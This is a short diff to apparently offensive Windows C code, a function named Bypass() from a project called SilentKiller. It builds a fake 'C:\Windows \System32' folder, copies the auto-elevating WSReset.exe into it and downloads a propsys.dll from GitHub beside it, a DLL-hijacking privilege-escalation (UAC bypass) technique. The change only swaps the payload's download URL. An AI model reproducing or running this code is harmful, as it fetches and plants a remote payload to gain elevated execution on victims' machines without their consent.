@@ -53,7 +53,7 @@ void Bypass()
     system("mkdir \"C:\\Windows \\\"");
     system("mkdir \"C:\\Windows \\System32\"");
     system("copy C:\\Windows\\System32\\WSReset.exe \"C:\\Windows \\System32\"");
-    URLDownloadToFileA(NULL, "https://raw.githubusercontent.com/wh0am178/SilentKiller/main/propsys.dll", "C:\\Windows \\System32\\propsys.dll", 0, NULL);
+    URLDownloadToFileA(NULL, "https://github.com/wh0am178/SilentKiller/releases/download/compiled/propsys.dll", "C:\\Windows \\System32\\propsys.dll", 0, NULL);
 }
 
 // Function to get the filepath of the executable
